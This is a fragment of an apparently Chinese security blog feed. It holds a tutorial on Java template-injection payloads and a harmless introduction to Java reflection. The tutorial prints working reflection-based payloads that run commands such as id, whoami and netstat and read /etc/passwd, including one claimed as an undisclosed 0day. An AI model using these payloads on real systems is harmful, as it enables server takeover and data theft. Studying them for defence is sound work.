etc/passwd’)}</li><li>${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}</li></ul></blockquote></li></ol><hr><h1 id="Template"><a href="#Template" class="headerlink" title="Template"></a>Template</h1><h2 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; 这里模板引擎是国内的模板引擎，漏洞还未必收录，故暂不公布，这里只做学习研究。如果你无意中接触过这个模板，如果你认出了这个模板，那么恭喜你获得0day一枚。笔者有一个请求如果你认出了，就不要公布了，0day你自己知道就好了。此款模板引擎禁止使用了<code>java.lang.Runtime</code>和<code>java.lang.ProcessBuilder</code>类的使用，使用Java的反射机制完美的bypass。</p><h2 id="payload构造"><a href="#payload构造" class="headerlink" title="payload构造"></a>payload构造</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(</span><br><span class="line">@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure><ol><li>我们且看第一行，按照上面给出简单案例方法，我们应该这样子就可以了<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,String.class).invoke(newInstance(),&quot;calc&quot;)</code></li><li>但是直接String.class直接写模板是找不到的，所以我们得继续构造payload，将String.class转化<code>@java.lang.Class.forName(&quot;java.lang.String&quot;)</code>的形式，然后payload就变成下面这样子了。<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;,@java.lang.Class.forName(&quot;java.lang.String&quot;)).invoke(newInstance(),&quot;calc&quot;)</code></li><li>照道理上面就可以直接使用了，但是呢Runtime类没有无参构造方法，因此不能使用newInstance()方法来实例化。只能通过调用getRuntime()方法来进行实例化。所以newInstance()得替换成<code>@java.lang.Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;,null)</code>最终payload就变成了下面这样子。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"exec"</span>,@java.lang.Class.forName(<span class="string">"java.lang.String"</span>)).invoke(@java.lang.Class.forName(<span class="string">"java.lang.Runtime"</span>).getMethod(<span class="string">"getRuntime"</span>,<span class="literal">null</span>).invoke(<span class="literal">null</span>,<span class="literal">null</span>),<span class="string">"calc"</span>)&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h1 id="Velocity"><a href="#Velocity" class="headerlink" title="Velocity"></a>Velocity</h1><h2 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Velocity是一个基于Java的模板引擎，是隶属于Apache旗下的一个开源项目。它允许任何人使用简单而强大的模板语言来引用Java代码中定义的对象。<br>&emsp;&emsp; 下面是Velocity的SSTI的payload，此时的你可能会有个疑问。payload语法好像有点奇怪？这个其实是模板语法，每一个模板引擎的语法都不同。笔者觉得大同小异，有过编程的基础童鞋，稍加学习就能明白。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><h3 id="set语法"><a href="#set语法" class="headerlink" title="#set语法"></a>#set语法</h3><p>&emsp;&emsp;  #set语法可以创建一个Velocity的变量，#set语法对应的Velocity语法树是ASTSetDirective类，翻开这个类的代码，可以发现它有两个子节点：分别是RightHandSide和LeftHandSide，分别代表“=”两边的表达式值。与Java语言的赋值操作有点不一样的是，左边的LeftHandSide可能是一个变量标识符，也可能是一个set方法调用。变量标识符很好理解，如前面的#set($ var=“偶数”)，另外是一个set方法调用，如#set($person.name=”junshan”)，这实际上相当于Java中person.setName(“junshan”)方法的调用。</p><h3 id="foreach语法"><a href="#foreach语法" class="headerlink" title="foreach语法"></a>foreach语法</h3><p>&emsp;&emsp; Velocity中的循环语法只有这一种，它与Java中的for循环的语法糖形式十分类似，如#foreach($ child in $person.children) $ person.children表示的是一个集合，它可能是一个List集合或者一个数组，而$ child表示的是每个从集合中取出的值。从render方法代码中可以看出，Velocity首先是取得$ person.children的值，然后将这个值封装成Iterator集合，然后依次取出这个集合中的每一个值，将这个值以$child为变量标识符放入context中。除此以外需要特别注意的是，Velocity在循环时还在context中放入了另外两个变量，分别是counterName和hasNextName，这两个变量的名称分别在配置文件配置项directive.foreach.counter.name和directive.foreach.iterator.name中定义，它们表示当前的循环计数和是否还有下一个值。前者相当于for(int i=1;i&lt;10;i++)中的i值，后者相当于while(it.hasNext())中的it.hasNext()的值，这两个值在#foreach的循环体中都有可能用到。由于elementKey、counterName和hasNextName是在#foreach中临时创建的，如果当前的context中已经存在这几个变量，要把原始的变量值保存起来，以便在这个#foreach执行结束后恢复。如果context中没有这几个变量，那么#foreach执行结束后要删除它们，这就是代码最后部分做的事情，这与我们前面介绍的#set语法没有范围限制不同，#foreach中临时产生的变量只在#foreach中有效。</p><p>更多语法知识推荐<a href="http://www.yunshouce.com/g62/velocitydoc/11.html" target="_blank" rel="noopener">Velocity中文文档</a>。</p><hr><h2 id="反射Payload"><a href="#反射Payload" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 了解语法之后，回头看payload会觉得很简单，其实就是基本的payload的构造。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#set($x="")  </span><br><span class="line">#set($rt=$x.class.forName("java.lang.Runtime"))</span><br><span class="line">#set($chr=$x.class.forName("java.lang.Character"))  </span><br><span class="line">#set($str=$x.class.forName("java.lang.String"))</span><br><span class="line">#set($ex=$rt.getRuntime().exec("calc"))$ex.waitFor() </span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>把payload转化成伪代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rt = java.lang.Runtime<span class="class">.<span class="keyword">class</span></span></span><br><span class="line"><span class="class"><span class="title">chr</span> </span>= java.lang.String</span><br><span class="line">ex = java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br><span class="line">ex.waitFor()</span><br><span class="line"><span class="comment">// 接着就是循环读取输出</span></span><br></pre></td></tr></table></figure><p><strong>推荐一个经典案例</strong><br><a href="https://samny.blog.csdn.net/article/details/102843715" target="_blank" rel="noopener">Apache Solr 模板注入远程命令执行</a>漏洞详情<br><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">白头搔更短，SSTI惹人心！</a>漏洞分析</p><hr><h1 id="Jinjava"><a href="#Jinjava" class="headerlink" title="Jinjava"></a>Jinjava</h1><h2 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp; Jinjava是一款开源的 Java 模板引擎，基于 django 模板语法，适用于渲染 jinja 模板（至少是 HubSpot 内容中使用的 jinja 子集）。目前在生产中用于渲染<code>HubSpot CMS</code>，每月有数以亿计的页面浏览量的网站。<a href="https://github.com/HubSpot/jinjava" target="_blank" rel="noopener">官方GitHub地址</a>。<br>判断Jinjava是否存在SSTI漏洞的payload：</p><ol><li>A 回显大写``A``</li><li> 会返回一个请求对象 例如：``com.[...].context.TemplateContextRequest@23548206``</li></ol><h2 id="反射Payload-1"><a href="#反射Payload-1" class="headerlink" title="反射Payload"></a>反射Payload</h2><p>&emsp;&emsp; 这款模板引擎的payload直接就能看出是用Java的反射机制，都是先获取的<code>javax.script.ScriptEngineManager</code>类对象，然后<code>newInstance()</code>实例化，在之后创建一个<code>JavaScript</code>引擎最后执行命令。<br><img src="https://img-blog.csdnimg.cn/20200430101257182.png" alt="在这里插入图片描述"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"new java.lang.String(<span class="string">'xxx'</span>)\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;&#123;<span class="string">'a'</span>.getClass().forName(<span class="string">'javax.script.ScriptEngineManager'</span>).newInstance().getEngineByName(<span class="string">'JavaScript'</span>).<span class="built_in">eval</span>(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")&#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="Pebble"><a href="#Pebble" class="headerlink" title="Pebble"></a>Pebble</h1><p>&emsp;&emsp; Pebble是一个受Twig启发的java模板化引擎。它以其继承功能和易读的语法从人群中脱颖而出。它内置了安全的自动缩放功能，并且包含了对国际化的集成支持。更多内容查看<a href="https://github.com/PebbleTemplates/pebble" target="_blank" rel="noopener">官方GitHub地址</a>，<a href="https://pebbletemplates.io/wiki/guide/basic-usage/" target="_blank" rel="noopener">官方文档</a>。<br>payload：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set cmd = <span class="string">'id'</span> %&#125;</span><br><span class="line">&#123;% set bytes = (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.Runtime'</span>)</span><br><span class="line">     .methods[<span class="number">6</span>]</span><br><span class="line">     .invoke(<span class="keyword">null</span>,<span class="keyword">null</span>)</span><br><span class="line">     .exec(cmd)</span><br><span class="line">     .inputStream</span><br><span class="line">     .readAllBytes() %&#125;</span><br><span class="line">&#123;&#123; (<span class="number">1</span>).TYPE</span><br><span class="line">     .forName(<span class="string">'java.lang.String'</span>)</span><br><span class="line">     .constructors[<span class="number">0</span>]</span><br><span class="line">     .newInstance(([bytes]).toArray()) &#125;&#125;</span><br></pre></td></tr></table></figure><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>&emsp;&emsp; 各大模板引擎在设计的时候，都或多或少变相禁止<code>java.lang.Runtime</code>和<code>java.lang.Processbuilder</code>类，因此使用Java的反射机制可以完全的绕过限制。想要深入学习SSTI漏洞的时候，建议看模板引擎官方给出的文档，在结合JDK文档大多数模板引擎是可以bypass的。</p><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://samny.blog.csdn.net/article/details/104881477" target="_blank" rel="noopener">https://samny.blog.csdn.net/article/details/104881477</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/309&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--序章</title>
    <link href="https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/"/>
    <id>https://summersec.github.io/2020/05/12/%E4%BB%8E%E5%AE%89%E5%85%A8%E8%A7%92%E5%BA%A6%E8%B0%88Java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6--%E5%BA%8F%E7%AB%A0/</id>
    <published>2020-05-12T08:42:16.000Z</published>
    <updated>2020-05-13T02:30:32.232Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>首发：<a href="https://www.sec-in.com/article/307" target="_blank" rel="noopener">https://www.sec-in.com/article/307</a><br>&emsp;&emsp; 众所周知，Java目前影响最大的是反序列化漏洞，换一句话说Java安全是从反序列化漏洞开始，但反序列化漏洞又可以基于反射，这次笔者带你走进Java安全的大门。<br>&emsp;&emsp; Java反序列化的payload大多与反射机制密切相关，但仅仅是因为这个吗？答案肯定是片面的。反射作为大多数编程语言里必不可缺的组成部分，对象可以通过反射获取其他的类，类可以通过反射拿到所有的方法（包括私有方法），获取到方法可以调用。一句话，反射给Java等类似的静态语言赋予了<code>“灵魂”</code>。</p><p>ps: 本文实验代码都上传<a href="https://github.com/samny520/JavaLearnVulnerability" target="_blank" rel="noopener">JavaLearnVulnerability</a>项目，为了让更多人知道，麻烦动动小手star一下。</p><hr><h1 id="反射基础"><a href="#反射基础" class="headerlink" title="反射基础"></a>反射基础</h1><p>&emsp;&emsp; Java反射操作的对象是<code>java.lang.Class</code>对象，如果想要使用Java反射，首先得获取Class对象。下面我们看一段代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">Class cls = Class.forName(className);</span><br><span class="line">cls.getMethod(methodName).invoke(cls.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例代码中，笔者演示几个比较重要的方法：</p><ul><li>获取类对象的方法<code>forName</code></li><li>从获取类对象中获取方法 <code>getMethod</code></li><li>执行得到获取的方法的方法<code>invoke</code></li><li>实例化对象<code>newInstance</code></li></ul><p>ps：当然反射不可能仅仅只是这些方法，下面中笔者有提及其他的方法，当然不可能是全部都一一道来，正所谓<code>授之与鱼，不如授之于渔</code>。更多方法建议大家去看JDK文档，在线的文档百度一搜就有。</p><hr><h2 id="类源码"><a href="#类源码" class="headerlink" title="类源码"></a>类源码</h2><p>&emsp;&emsp; 首先笔者构造了两个类<code>students</code>和<code>classdemo1</code>。</p><hr><h3 id="实体类students源码："><a href="#实体类students源码：" class="headerlink" title="实体类students源码："></a>实体类<code>students</code>源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Students</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Integer age = <span class="number">18</span>;</span><br><span class="line">    <span class="keyword">private</span> String name = <span class="string">"samny"</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer CardId = <span class="number">332323223</span>;</span><br><span class="line">    <span class="keyword">private</span> Integer id = <span class="number">10012</span>;</span><br><span class="line">    <span class="keyword">private</span> String hello = <span class="string">"hello world"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">(Integer age, String name, Integer cardId, Integer id, String hello)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">        <span class="keyword">this</span>.CardId = cardId;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">        <span class="keyword">this</span>.hello = hello;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Students&#123;"</span> +</span><br><span class="line">                <span class="string">"age="</span> + age +</span><br><span class="line">                <span class="string">", name='"</span> + name + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">", CardId="</span> + CardId +</span><br><span class="line">                <span class="string">", id="</span> + id +</span><br><span class="line">                <span class="string">", ags='"</span> + hello + <span class="string">'\''</span> +</span><br><span class="line">                <span class="string">'&#125;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Students</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 以下省略set，get以及toString方法。</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="实体类classdemo1的源码："><a href="#实体类classdemo1的源码：" class="headerlink" title="实体类classdemo1的源码："></a>实体类<code>classdemo1</code>的源码：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">classdemo1</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span>  String  name;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"parameterlessMethod：hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print2</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        System.out.println( <span class="string">"parameterMethod: hello"</span> + name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h3 id="反射方法获取Students类。"><a href="#反射方法获取Students类。" class="headerlink" title="反射方法获取Students类。"></a>反射方法获取Students类。</h3><blockquote><p>实例化所需要的类集合  Class[] classes = new Class[]{Integer.class,String.class,Integer.class,Integer.class,String.class};<br>通过构造器构造类Constructor constructor = cls.getDeclaredConstructor(classes);<br>通过调用有参构造器实例化类Object str = constructor.newInstance(18, “samny”, 32326663, 10021, “hello!!”);</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 获取对象</span></span><br><span class="line"></span><br><span class="line">            Class cls = Class.forName(<span class="string">"samny.reflection.Students"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//            // 获取构造器方法</span></span><br><span class="line">            Class[] classes = <span class="keyword">new</span> Class[]&#123;Integer<span class="class">.<span class="keyword">class</span>,<span class="title">String</span>.<span class="title">class</span>,</span></span><br><span class="line"><span class="class">                    <span class="title">Integer</span>.<span class="title">class</span>,<span class="title">Integer</span>.<span class="title">class</span>,<span class="title">String</span>.<span class="title">class</span>&#125;</span>;</span><br><span class="line">            Constructor constructor = cls.getDeclaredConstructor(classes);</span><br><span class="line"></span><br><span class="line">            Object str = constructor.newInstance(<span class="number">18</span>, <span class="string">"samny"</span>, <span class="number">32326663</span>, <span class="number">10021</span>, <span class="string">"hello!!"</span>);</span><br><span class="line">            System.out.println(str);</span><br><span class="line">            <span class="comment">// 或者下面这样子输出</span></span><br><span class="line"><span class="comment">//            System.out.println(constructor.newInstance(18, "samny", 32326663, 10021, "hello!!"));</span></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | NoSuchMethodException |</span><br><span class="line">                IllegalAccessException | InstantiationException | InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="常规开发人员实例化类构造类demo"><a href="#常规开发人员实例化类构造类demo" class="headerlink" title="常规开发人员实例化类构造类demo"></a>常规开发人员实例化类构造类demo</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Sts</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Students students = <span class="keyword">new</span> Students();</span><br><span class="line">        students.setAge(<span class="number">18</span>);</span><br><span class="line">        students.setName(<span class="string">"samny"</span>);</span><br><span class="line">        students.setCardId(<span class="number">32336666</span>);</span><br><span class="line">        students.setId(<span class="number">1001</span>);</span><br><span class="line">        students.setAgs(<span class="string">"helloooo!!"</span>);</span><br><span class="line">        System.out.println(students.toString());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>对比一下效果是没有任何的区别，但反射操作只需要知道类名就可以完全操作类甚至是类中的私有方法之后文章会详细说明，本文不做说明。<br><img src="https://img-blog.csdnimg.cn/20200428161706305.png" alt="在这里插入图片描述"></p><hr><h3 id="反射调用类中的无参和有参方法。"><a href="#反射调用类中的无参和有参方法。" class="headerlink" title="反射调用类中的无参和有参方法。"></a>反射调用类中的无参和有参方法。</h3><blockquote><p>之前说过的知识就不在说明<br>开头就说了，invoke是执行获取类得到方法的方法<br>但调用有参方法和无参方法有点细微的差别<br><code>getMethod</code>方法的第一个参数是类方法名称，第二个是类对象。这里先留个疑问，如果是多个类对象呢？<br><code>invoke</code>函数的第一个参数是<code>实例化</code>的类对象，第二个是参数值<br>常规方法的调用，直接<code>Class.method()</code>即可</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">reflectmethod2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class  cls = Class.forName(<span class="string">"samny.reflection.classdemo1"</span>);</span><br><span class="line">            <span class="comment">// 无参方法调用</span></span><br><span class="line">            Object ob = cls.newInstance();</span><br><span class="line"><span class="comment">//            Method mt = cls.getMethod("print"); 有没有null均可</span></span><br><span class="line">            Method mt = cls.getMethod(<span class="string">"print"</span>,<span class="keyword">null</span>);</span><br><span class="line">            mt.invoke(ob,<span class="keyword">null</span>);</span><br><span class="line">            <span class="comment">// 有参方法调用</span></span><br><span class="line">            Method mt2 = cls.getMethod(<span class="string">"print2"</span>, String<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">            mt2.invoke(ob,<span class="string">"world"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200428162508475.png" alt="在这里插入图片描述"></p><hr><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>P神-Java安全漫谈-反射篇</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;首发：&lt;a href=&quot;https://www.sec-in.com/article/307&quot; target=&quot;_blank&quot; rel=&quot;n
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://summersec.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="Java反射" scheme="https://summersec.github.io/tags/Java%E5%8F%8D%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>从安全角度谈Java反射机制--前章</title>
